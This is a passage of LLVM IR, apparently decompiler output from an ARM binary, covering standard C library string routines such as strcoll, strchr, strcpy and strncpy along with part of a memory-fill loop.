  %v6_1169050 = add i32 %v0_1169028, 8
  store i32 %v6_1169050, i32* %r3.global-to-local, align 4
  %v0_1169451 = load i32, i32* @r2, align 4
  %v1_1169452 = add i32 %v0_1169451, -8
  store i32 %v1_1169452, i32* %r2.global-to-local, align 4
  %v5_1169c53 = icmp slt i32 %v1_1169452, 8
  br i1 %v5_1169c53, label %dec_label_pc_11690.dec_label_pc_116c8.loopexit_crit_edge, label %dec_label_pc_116a0

dec_label_pc_116a0:                               ; preds = %dec_label_pc_11690.preheader, %dec_label_pc_11688.dec_label_pc_11690_crit_edge
  %v6_1169055 = phi i32 [ %v6_11690, %dec_label_pc_11688.dec_label_pc_11690_crit_edge ], [ %v6_1169050, %dec_label_pc_11690.preheader ]
  %v0_1169054 = phi i32 [ %v12_116bc, %dec_label_pc_11688.dec_label_pc_11690_crit_edge ], [ %v0_1169028, %dec_label_pc_11690.preheader ]
  %v1_116a0 = inttoptr i32 %v6_1169055 to i32*
  %v2_116a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_116a0, i32* %v1_116a0, align 4
  %v3_116a0 = add i32 %v0_1169054, 12
  %v4_116a0 = inttoptr i32 %v3_116a0 to i32*
  %v5_116a0 = load i32, i32* @ip, align 4
  store i32 %v5_116a0, i32* %v4_116a0, align 4
  %v6_116a0 = add i32 %v0_1169054, 16
  store i32 %v6_116a0, i32* %r3.global-to-local, align 4
  %v0_116a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_116a4 = add i32 %v0_116a4, -8
  store i32 %v1_116a4, i32* %r2.global-to-local, align 4
  %v5_116ac = icmp slt i32 %v1_116a4, 8
  br i1 %v5_116ac, label %dec_label_pc_116a0.dec_label_pc_116c8.loopexit_crit_edge, label %dec_label_pc_116b0

dec_label_pc_116b0:                               ; preds = %dec_label_pc_116a0
  %v1_116b0 = inttoptr i32 %v6_116a0 to i32*
  %v2_116b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_116b0, i32* %v1_116b0, align 4
  %v3_116b0 = add i32 %v0_1169054, 20
  %v4_116b0 = inttoptr i32 %v3_116b0 to i32*
  %v5_116b0 = load i32, i32* @ip, align 4
  store i32 %v5_116b0, i32* %v4_116b0, align 4
  %v6_116b0 = add i32 %v0_1169054, 24
  store i32 %v6_116b0, i32* %r3.global-to-local, align 4
  %v0_116b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_116b4 = add i32 %v0_116b4, -8
  store i32 %v1_116b4, i32* %r2.global-to-local, align 4
  %v5_116bc = icmp slt i32 %v1_116b4, 8
  br i1 %v5_116bc, label %dec_label_pc_116b0.dec_label_pc_116c8.loopexit_crit_edge, label %dec_label_pc_11688

dec_label_pc_11688:                               ; preds = %dec_label_pc_116b0
  %v7_116bc = inttoptr i32 %v6_116b0 to i32*
  %v8_116bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_116bc, i32* %v7_116bc, align 4
  %v9_116bc = add i32 %v0_1169054, 28
  %v10_116bc = inttoptr i32 %v9_116bc to i32*
  %v11_116bc = load i32, i32* @ip, align 4
  store i32 %v11_116bc, i32* %v10_116bc, align 4
  %v12_116bc = add i32 %v0_1169054, 32
  store i32 %v12_116bc, i32* %r3.global-to-local, align 4
  %v6_116c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_116c0 = add i32 %v6_116c0, -8
  store i32 %v7_116c0, i32* %r2.global-to-local, align 4
  %v5_1168c = icmp slt i32 %v7_116c0, 8
  br i1 %v5_1168c, label %dec_label_pc_11688.dec_label_pc_116c8.loopexit_crit_edge, label %dec_label_pc_11688.dec_label_pc_11690_crit_edge

dec_label_pc_11688.dec_label_pc_11690_crit_edge:  ; preds = %dec_label_pc_11688
  %v2_11690.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11690 = inttoptr i32 %v12_116bc to i32*
  store i32 %v2_11690.pre, i32* %v1_11690, align 4
  %v3_11690 = add i32 %v0_1169054, 36
  %v4_11690 = inttoptr i32 %v3_11690 to i32*
  %v5_11690 = load i32, i32* @ip, align 4
  store i32 %v5_11690, i32* %v4_11690, align 4
  %v6_11690 = add i32 %v0_1169054, 40
  store i32 %v6_11690, i32* %r3.global-to-local, align 4
  %v0_11694 = load i32, i32* %r2.global-to-local, align 4
  %v1_11694 = add i32 %v0_11694, -8
  store i32 %v1_11694, i32* %r2.global-to-local, align 4
  %v5_1169c = icmp slt i32 %v1_11694, 8
  br i1 %v5_1169c, label %dec_label_pc_11690.dec_label_pc_116c8.loopexit_crit_edge, label %dec_label_pc_116a0

dec_label_pc_11690.dec_label_pc_116c8.loopexit_crit_edge: ; preds = %dec_label_pc_11688.dec_label_pc_11690_crit_edge, %dec_label_pc_11690.preheader
  %v1_11694.lcssa = phi i32 [ %v1_1169452, %dec_label_pc_11690.preheader ], [ %v1_11694, %dec_label_pc_11688.dec_label_pc_11690_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116c8

dec_label_pc_11688.dec_label_pc_116c8.loopexit_crit_edge: ; preds = %dec_label_pc_11688
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116c8

dec_label_pc_116a0.dec_label_pc_116c8.loopexit_crit_edge: ; preds = %dec_label_pc_116a0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116c8

dec_label_pc_116b0.dec_label_pc_116c8.loopexit_crit_edge: ; preds = %dec_label_pc_116b0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116c8

dec_label_pc_116c8:                               ; preds = %dec_label_pc_11684, %dec_label_pc_11690.dec_label_pc_116c8.loopexit_crit_edge, %dec_label_pc_11688.dec_label_pc_116c8.loopexit_crit_edge, %dec_label_pc_116a0.dec_label_pc_116c8.loopexit_crit_edge, %dec_label_pc_116b0.dec_label_pc_116c8.loopexit_crit_edge, %entry
  %v0_116d0 = phi i32 [ %v0_11664, %entry ], [ %v1_116b4, %dec_label_pc_116b0.dec_label_pc_116c8.loopexit_crit_edge ], [ %v1_116a4, %dec_label_pc_116a0.dec_label_pc_116c8.loopexit_crit_edge ], [ %v7_116c0, %dec_label_pc_11688.dec_label_pc_116c8.loopexit_crit_edge ], [ %v1_11694.lcssa, %dec_label_pc_11690.dec_label_pc_116c8.loopexit_crit_edge ], [ %v0_11688.pr, %dec_label_pc_11684 ]
  %v2_116c8 = icmp eq i32 %v0_116d0, 0
  store i1 %v2_116c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116c8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_116c8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_116c8
  %v1_116d0 = sub i32 7, %v0_116d0
  store i32 %v1_116d0, i32* %r2.global-to-local, align 4
  %v3_116d4 = mul i32 %v1_116d0, 4
  %v4_116d4 = add i32 %v3_116d4, ptrtoint (i32* @global_var_116dc.407 to i32)
  call void @__pseudo_branch(i32 %v4_116d4)
  %v0_116dc = load i32, i32* %r1.global-to-local, align 4
  %v1_116dc = trunc i32 %v0_116dc to i8
  %v2_116dc = load i32, i32* %r3.global-to-local, align 4
  %v3_116dc = inttoptr i32 %v2_116dc to i8*
  store i8 %v1_116dc, i8* %v3_116dc, align 1
  %v4_116dc = load i32, i32* %r3.global-to-local, align 4
  %v5_116dc = add i32 %v4_116dc, 1
  store i32 %v5_116dc, i32* %r3.global-to-local, align 4
  %v0_116e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_116e0 = trunc i32 %v0_116e0 to i8
  %v3_116e0 = inttoptr i32 %v5_116dc to i8*
  store i8 %v1_116e0, i8* %v3_116e0, align 1
  %v4_116e0 = load i32, i32* %r3.global-to-local, align 4
  %v5_116e0 = add i32 %v4_116e0, 1
  store i32 %v5_116e0, i32* %r3.global-to-local, align 4
  %v0_116e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_116e4 = trunc i32 %v0_116e4 to i8
  %v3_116e4 = inttoptr i32 %v5_116e0 to i8*
  store i8 %v1_116e4, i8* %v3_116e4, align 1
  %v4_116e4 = load i32, i32* %r3.global-to-local, align 4
  %v5_116e4 = add i32 %v4_116e4, 1
  store i32 %v5_116e4, i32* %r3.global-to-local, align 4
  %v0_116e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_116e8 = trunc i32 %v0_116e8 to i8
  %v3_116e8 = inttoptr i32 %v5_116e4 to i8*
  store i8 %v1_116e8, i8* %v3_116e8, align 1
  %v4_116e8 = load i32, i32* %r3.global-to-local, align 4
  %v5_116e8 = add i32 %v4_116e8, 1
  store i32 %v5_116e8, i32* %r3.global-to-local, align 4
  %v0_116ec = load i32, i32* %r1.global-to-local, align 4
  %v1_116ec = trunc i32 %v0_116ec to i8
  %v3_116ec = inttoptr i32 %v5_116e8 to i8*
  store i8 %v1_116ec, i8* %v3_116ec, align 1
  %v4_116ec = load i32, i32* %r3.global-to-local, align 4
  %v5_116ec = add i32 %v4_116ec, 1
  store i32 %v5_116ec, i32* %r3.global-to-local, align 4
  %v0_116f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_116f0 = trunc i32 %v0_116f0 to i8
  %v3_116f0 = inttoptr i32 %v5_116ec to i8*
  store i8 %v1_116f0, i8* %v3_116f0, align 1
  %v4_116f0 = load i32, i32* %r3.global-to-local, align 4
  %v5_116f0 = add i32 %v4_116f0, 1
  store i32 %v5_116f0, i32* %r3.global-to-local, align 4
  %v0_116f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_116f4 = trunc i32 %v0_116f4 to i8
  %v3_116f4 = inttoptr i32 %v5_116f0 to i8*
  store i8 %v1_116f4, i8* %v3_116f4, align 1
  %v4_116f4 = load i32, i32* %r3.global-to-local, align 4
  %v5_116f4 = add i32 %v4_116f4, 1
  store i32 %v5_116f4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11690, { 1, 0 }
  uselistorder i32 %v12_116bc, { 1, 2, 0 }
  uselistorder i32 %v0_1169054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11688.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11678, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1166c, { 1, 0 }
  uselistorder i32 %v0_11664, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 13, 9, 10, 11, 12, 7, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 3, 0, 5, 8, 7, 4, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_116c8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_116a0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_11704.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_11704 = phi i32 [ %v0_11704.pre, %bb ], [ %v5_11704, %bb3 ]
  %v0_11700 = phi i32 [ %tmp, %bb ], [ %v5_11700, %bb3 ]
  %v1_11700 = inttoptr i32 %v0_11700 to i8*
  %v2_11700 = load i8, i8* %v1_11700, align 1
  %v1_11704 = inttoptr i32 %v0_11704 to i8*
  %v2_11704 = load i8, i8* %v1_11704, align 1
  %v3_11704 = zext i8 %v2_11704 to i32
  %v2_11708 = icmp eq i8 %v2_11700, 0
  br i1 %v2_11708, label %.dec_label_pc_11714_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_11704 = add i32 %v0_11704, 1
  %v5_11700 = add i32 %v0_11700, 1
  %v3_11700 = zext i8 %v2_11700 to i32
  %v10_1170c = icmp eq i8 %v2_11700, %v2_11704
  br i1 %v10_1170c, label %entry, label %dec_label_pc_11714

.dec_label_pc_11714_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_11714

dec_label_pc_11714:                               ; preds = %bb3, %.dec_label_pc_11714_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_11714_crit_edge ], [ %v3_11700, %bb3 ]
  %v2_11714.pre-phi = sub nsw i32 %.pn, %v3_11704
  ret i32 %v2_11714.pre-phi

; uselistorder directives
  uselistorder i8 %v2_11700, { 0, 2, 1 }
  uselistorder i32 %v0_11700, { 1, 0 }
  uselistorder i32 %v0_11704, { 1, 0 }
  uselistorder label %dec_label_pc_11714, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_11780 = load i32, i32* @r5, align 4
  %v9_11780 = load i32, i32* @r6, align 4
  %v1_11784 = urem i32 %arg1, 256
  br label %dec_label_pc_117a4

dec_label_pc_1178c:                               ; preds = %dec_label_pc_117a4
  %v3_1178c = load i8, i8* %.0, align 1
  %v4_1178c = zext i8 %v3_1178c to i32
  %v9_11790 = icmp eq i32 %v4_1178c, %v1_11784
  br i1 %v9_11790, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_1178c
  ret i32 %v1_117a4

bb24:                                             ; preds = %dec_label_pc_1178c
  %v2_11798 = icmp eq i8 %v3_1178c, 0
  %v2_1179c = add i32 %v1_117a4, 1
  %v3_1179c = inttoptr i32 %v2_1179c to i8*
  br i1 %v2_11798, label %dec_label_pc_11878, label %dec_label_pc_117a4

dec_label_pc_117a4:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_1179c, %bb24 ]
  %v1_117a4 = ptrtoint i8* %.0 to i32
  %v2_117a4 = urem i32 %v1_117a4, 4
  %v3_117a4 = icmp eq i32 %v2_117a4, 0
  br i1 %v3_117a4, label %dec_label_pc_117ac, label %dec_label_pc_1178c

dec_label_pc_117ac:                               ; preds = %dec_label_pc_117a4
  %v4_117ac = mul nuw nsw i32 %v1_11784, 256
  %v5_117ac = or i32 %v4_117ac, %v1_11784
  %v4_117b4 = mul i32 %v5_117ac, 65536
  %v5_117b4 = or i32 %v4_117b4, %v5_117ac
  br label %dec_label_pc_117b8

dec_label_pc_117b8:                               ; preds = %dec_label_pc_11870, %dec_label_pc_117f8, %dec_label_pc_117ac
  %v0_1181c = phi i32 [ %v1_117a4, %dec_label_pc_117ac ], [ %v4_117b8, %dec_label_pc_117f8 ], [ %v4_117b8, %dec_label_pc_11870 ]
  %v1_117b8 = inttoptr i32 %v0_1181c to i32*
  %v2_117b8 = load i32, i32* %v1_117b8, align 4
  %v4_117b8 = add i32 %v0_1181c, 4
  %v2_117c0 = xor i32 %v2_117b8, %v5_117b4
  %v2_117cc = add i32 %v2_117b8, 2130640639
  %v1_117d0 = sub i32 -1, %v2_117b8
  %v2_117d4 = xor i32 %v2_117cc, %v1_117d0
  %v2_117d8 = add i32 %v2_117c0, 2130640639
  %v1_117e0 = sub i32 -1, %v2_117c0
  %v2_117e4 = and i32 %v2_117d4, -2130640640
  %v2_117e8 = xor i32 %v2_117d8, %v1_117e0
  %v2_117ec = icmp eq i32 %v2_117e4, 0
  %v2_117f0 = and i32 %v2_117e8, -2130640640
  store i32 %v2_117f0, i32* @lr, align 4
  br i1 %v2_117ec, label %dec_label_pc_117f8, label %dec_label_pc_11800

dec_label_pc_117f8:                               ; preds = %dec_label_pc_117b8
  %v2_117f8 = icmp eq i32 %v2_117f0, 0
  br i1 %v2_117f8, label %dec_label_pc_117b8, label %dec_label_pc_11800

dec_label_pc_11800:                               ; preds = %dec_label_pc_117b8, %dec_label_pc_117f8
  %v2_11800 = inttoptr i32 %v0_1181c to i8*
  %v3_11800 = load i8, i8* %v2_11800, align 1
  %v4_11800 = zext i8 %v3_11800 to i32
  %v1_11808 = add i32 %v0_1181c, 1
  %v1_1180c = add i32 %v0_1181c, 2
  %v9_11810 = icmp eq i32 %v4_11800, %v1_11784
  %v1_11814 = add i32 %v0_1181c, 3
  store i32 %v1_11814, i32* @ip, align 4
  br i1 %v9_11810, label %dec_label_pc_1181c, label %dec_label_pc_11824

dec_label_pc_1181c:                               ; preds = %dec_label_pc_11800
  store i32 %v6_11780, i32* @r5, align 4
  store i32 %v9_11780, i32* @r6, align 4
  ret i32 %v0_1181c

dec_label_pc_11824:                               ; preds = %dec_label_pc_11800
  %v2_11824 = icmp eq i8 %v3_11800, 0
  br i1 %v2_11824, label %dec_label_pc_11878, label %dec_label_pc_1182c

dec_label_pc_1182c:                               ; preds = %dec_label_pc_11824
  %v2_1182c = inttoptr i32 %v1_11808 to i8*
  %v3_1182c = load i8, i8* %v2_1182c, align 1
  %v4_1182c = zext i8 %v3_1182c to i32
  %v9_11830 = icmp eq i32 %v4_1182c, %v1_11784
  br i1 %v9_11830, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_1182c
  store i32 %v6_11780, i32* @r5, align 4
  store i32 %v9_11780, i32* @r6, align 4
  ret i32 %v1_11808

bb26:                                             ; preds = %dec_label_pc_1182c
  %v2_11838 = icmp eq i8 %v3_1182c, 0
  br i1 %v2_11838, label %dec_label_pc_11878, label %dec_label_pc_11840

dec_label_pc_11840:                               ; preds = %bb26
  %v2_11840 = inttoptr i32 %v1_1180c to i8*
  %v3_11840 = load i8, i8* %v2_11840, align 1
  %v4_11840 = zext i8 %v3_11840 to i32
  %v9_11844 = icmp eq i32 %v4_11840, %v1_11784
  br i1 %v9_11844, label %dec_label_pc_1184c, label %dec_label_pc_11854

dec_label_pc_1184c:                               ; preds = %dec_label_pc_11840
  store i32 %v6_11780, i32* @r5, align 4
  store i32 %v9_11780, i32* @r6, align 4
  ret i32 %v1_1180c

dec_label_pc_11854:                               ; preds = %dec_label_pc_11840
  %v2_11854 = icmp eq i8 %v3_11840, 0
  br i1 %v2_11854, label %dec_label_pc_11878, label %dec_label_pc_1185c

dec_label_pc_1185c:                               ; preds = %dec_label_pc_11854
  %v2_1185c = inttoptr i32 %v1_11814 to i8*
  %v3_1185c = load i8, i8* %v2_1185c, align 1
  %v4_1185c = zext i8 %v3_1185c to i32
  %v9_11860 = icmp eq i32 %v4_1185c, %v1_11784
  br i1 %v9_11860, label %dec_label_pc_11868, label %dec_label_pc_11870

dec_label_pc_11868:                               ; preds = %dec_label_pc_1185c
  store i32 %v6_11780, i32* @r5, align 4
  store i32 %v9_11780, i32* @r6, align 4
  ret i32 %v1_11814

dec_label_pc_11870:                               ; preds = %dec_label_pc_1185c
  %v2_11870 = icmp eq i8 %v3_1185c, 0
  br i1 %v2_11870, label %dec_label_pc_11878, label %dec_label_pc_117b8

dec_label_pc_11878:                               ; preds = %bb24, %dec_label_pc_11870, %dec_label_pc_11854, %bb26, %dec_label_pc_11824
  store i32 %v6_11780, i32* @r5, align 4
  store i32 %v9_11780, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_117b8, { 1, 0 }
  uselistorder i32 %v2_117b8, { 0, 2, 1 }
  uselistorder i32 %v0_1181c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_117ac, { 1, 0 }
  uselistorder i32 %v1_117a4, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_11784, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_11780, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_11780, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_11878, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_11800, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_11888 = sub i32 %arg1, %tmp
  %v1_1188c = add i32 %v2_11888, -1
  store i32 %v1_1188c, i32* %r2.global-to-local, align 4
  %v2_118904 = load i8, i8* %arg2, align 1
  %v5_118906 = add i32 %tmp, 1
  store i32 %v5_118906, i32* %r1.global-to-local, align 4
  %v2_118947 = icmp eq i8 %v2_118904, 0
  store i1 %v2_118947, i1* %cpsr_z.global-to-local, align 1
  %v5_118988 = inttoptr i32 %arg1 to i8*
  store i8 %v2_118904, i8* %v5_118988, align 1
  %v0_1189c9 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1189c9, label %dec_label_pc_118a0, label %dec_label_pc_11890.dec_label_pc_11890_crit_edge

dec_label_pc_11890.dec_label_pc_11890_crit_edge:  ; preds = %entry, %dec_label_pc_11890.dec_label_pc_11890_crit_edge
  %v0_11890.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_11898.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11890 = inttoptr i32 %v0_11890.pre to i8*
  %v2_11890 = load i8, i8* %v1_11890, align 1
  %v5_11890 = add i32 %v0_11890.pre, 1
  store i32 %v5_11890, i32* %r1.global-to-local, align 4
  %v2_11894 = icmp eq i8 %v2_11890, 0
  store i1 %v2_11894, i1* %cpsr_z.global-to-local, align 1
  %v4_11898 = add i32 %v5_11890, %v3_11898.pre
  %v5_11898 = inttoptr i32 %v4_11898 to i8*
  store i8 %v2_11890, i8* %v5_11898, align 1
  %v0_1189c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1189c, label %dec_label_pc_118a0, label %dec_label_pc_11890.dec_label_pc_11890_crit_edge

dec_label_pc_118a0:                               ; preds = %dec_label_pc_11890.dec_label_pc_11890_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11890.dec_label_pc_11890_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_118a4 = icmp eq i32 %arg2, 3
  store i1 %v7_118a4, i1* %cpsr_z.global-to-local, align 1
  %v1_118ac = add i32 %arg1, -1
  store i32 %v1_118ac, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_11928, label %dec_label_pc_118b4

dec_label_pc_118b4:                               ; preds = %entry
  %v3_118b4 = udiv i32 %arg2, 4
  store i32 %v3_118b4, i32* @lr, align 4
  %v0_118b8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_118b8

dec_label_pc_118b8:                               ; preds = %dec_label_pc_11904, %dec_label_pc_118b4
  %v2_118c0 = phi i32 [ %v6_118f8, %dec_label_pc_11904 ], [ %v1_118ac, %dec_label_pc_118b4 ]
  %v0_118b8 = phi i32 [ %v1_11908, %dec_label_pc_11904 ], [ %v0_118b8.pre, %dec_label_pc_118b4 ]
  %v1_118b8 = inttoptr i32 %v0_118b8 to i8*
  %v2_118b8 = load i8, i8* %v1_118b8, align 1
  %v3_118b8 = zext i8 %v2_118b8 to i32
  store i32 %v3_118b8, i32* %r3.global-to-local, align 4
  %v2_118bc = icmp eq i8 %v2_118b8, 0
  store i1 %v2_118bc, i1* %cpsr_z.global-to-local, align 1
  %v3_118c0 = add i32 %v2_118c0, 1
  %v4_118c0 = inttoptr i32 %v3_118c0 to i8*
  store i8 %v2_118b8, i8* %v4_118c0, align 1
  %v5_118c0 = load i32, i32* %ip.global-to-local, align 4
  %v6_118c0 = add i32 %v5_118c0, 1
  store i32 %v6_118c0, i32* %ip.global-to-local, align 4
  %v0_118c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_118c4, label %dec_label_pc_11914, label %dec_label_pc_118c8

dec_label_pc_118c8:                               ; preds = %dec_label_pc_118b8
  %v0_118c8 = load i32, i32* @r1, align 4
  %v1_118c8 = add i32 %v0_118c8, 1
  %v2_118c8 = inttoptr i32 %v1_118c8 to i8*
  %v3_118c8 = load i8, i8* %v2_118c8, align 1
  %v4_118c8 = zext i8 %v3_118c8 to i32
  store i32 %v4_118c8, i32* %r3.global-to-local, align 4
  %v2_118cc = icmp eq i8 %v3_118c8, 0
  store i1 %v2_118cc, i1* %cpsr_z.global-to-local, align 1
  %v3_118d0 = add i32 %v5_118c0, 2
  %v4_118d0 = inttoptr i32 %v3_118d0 to i8*
  store i8 %v3_118c8, i8* %v4_118d0, align 1
  %v5_118d0 = load i32, i32* %ip.global-to-local, align 4
  %v6_118d0 = add i32 %v5_118d0, 1
  store i32 %v6_118d0, i32* %ip.global-to-local, align 4
  %v0_118d4 = load i32, i32* @r1, align 4
  %v1_118d4 = add i32 %v0_118d4, 1
  store i32 %v1_118d4, i32* %r1.global-to-local, align 4
  %v0_118d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_118d8, label %dec_label_pc_11914, label %dec_label_pc_118dc

dec_label_pc_118dc:                               ; preds = %dec_label_pc_118c8
  %v1_118dc = add i32 %v0_118d4, 2
  %v2_118dc = inttoptr i32 %v1_118dc to i8*
  %v3_118dc = load i8, i8* %v2_118dc, align 1
  %v4_118dc = zext i8 %v3_118dc to i32
  store i32 %v4_118dc, i32* %r3.global-to-local, align 4
  %v2_118e0 = icmp eq i8 %v3_118dc, 0
  store i1 %v2_118e0, i1* %cpsr_z.global-to-local, align 1
  %v3_118e4 = add i32 %v5_118d0, 2
  %v4_118e4 = inttoptr i32 %v3_118e4 to i8*
  store i8 %v3_118dc, i8* %v4_118e4, align 1
  %v5_118e4 = load i32, i32* %ip.global-to-local, align 4
  %v6_118e4 = add i32 %v5_118e4, 1
  store i32 %v6_118e4, i32* %ip.global-to-local, align 4
  %v0_118e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_118e8 = add i32 %v0_118e8, 1
  store i32 %v1_118e8, i32* %r1.global-to-local, align 4
  %v0_118ec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_118ec, label %dec_label_pc_11914, label %dec_label_pc_118f0

dec_label_pc_118f0:                               ; preds = %dec_label_pc_118dc
  %v1_118f0 = add i32 %v0_118e8, 2
  %v2_118f0 = inttoptr i32 %v1_118f0 to i8*
  %v3_118f0 = load i8, i8* %v2_118f0, align 1
  %v4_118f0 = zext i8 %v3_118f0 to i32
  store i32 %v4_118f0, i32* %r3.global-to-local, align 4
  %v2_118f4 = icmp eq i8 %v3_118f0, 0
  store i1 %v2_118f4, i1* %cpsr_z.global-to-local, align 1
  %v3_118f8 = add i32 %v5_118e4, 2
  %v4_118f8 = inttoptr i32 %v3_118f8 to i8*
  store i8 %v3_118f0, i8* %v4_118f8, align 1
  %v5_118f8 = load i32, i32* %ip.global-to-local, align 4
  %v6_118f8 = add i32 %v5_118f8, 1
  store i32 %v6_118f8, i32* %ip.global-to-local, align 4
  %v0_118fc = load i32, i32* %r1.global-to-local, align 4
  %v1_118fc = add i32 %v0_118fc, 1
  store i32 %v1_118fc, i32* %r1.global-to-local, align 4
  %v0_11900 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11900, label %dec_label_pc_11914, label %dec_label_pc_11904

dec_label_pc_11904:                               ; preds = %dec_label_pc_118f0
  %v0_11904 = load i32, i32* @lr, align 4
  %v1_11904 = add i32 %v0_11904, -1
  store i32 %v1_11904, i32* @lr, align 4
  %v7_11904 = icmp eq i32 %v0_11904, 1
  store i1 %v7_11904, i1* %cpsr_z.global-to-local, align 1
  %v1_11908 = add i32 %v0_118fc, 2
  store i32 %v1_11908, i32* @r1, align 4
  br i1 %v7_11904, label %dec_label_pc_11928, label %dec_label_pc_118b8

dec_label_pc_11914:                               ; preds = %dec_label_pc_118f0, %dec_label_pc_118dc, %dec_label_pc_118c8, %dec_label_pc_118b8
  %v1_11914 = phi i32 [ %v6_118f8, %dec_label_pc_118f0 ], [ %v6_118e4, %dec_label_pc_118dc ], [ %v6_118d0, %dec_label_pc_118c8 ], [ %v6_118c0, %dec_label_pc_118b8 ]
  %v2_119141 = sub i32 %arg1, %v1_11914
  %v2_11918 = add i32 %v2_119141, %arg2
  store i32 %v2_11918, i32* %r3.global-to-local, align 4
  %v1_1191c = add i32 %v2_11918, -1
  store i32 %v1_1191c, i32* %r2.global-to-local, align 4
  %v7_1191c = icmp eq i32 %v2_11918, 1
  store i1 %v7_1191c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1191c, label %bb, label %dec_label_pc_11948

bb:                                               ; preds = %dec_label_pc_11914
  ret i32 %arg1

dec_label_pc_11928:                               ; preds = %dec_label_pc_11904, %entry
  %v2_119386 = phi i32 [ %v1_118ac, %entry ], [ %v6_118f8, %dec_label_pc_11904 ]
  %v1_11928 = urem i32 %arg2, 4
  store i32 %v1_11928, i32* %r2.global-to-local, align 4
  %v2_11928 = icmp eq i32 %v1_11928, 0
  store i1 %v2_11928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11928, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_11928
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_11928, %._crit_edge
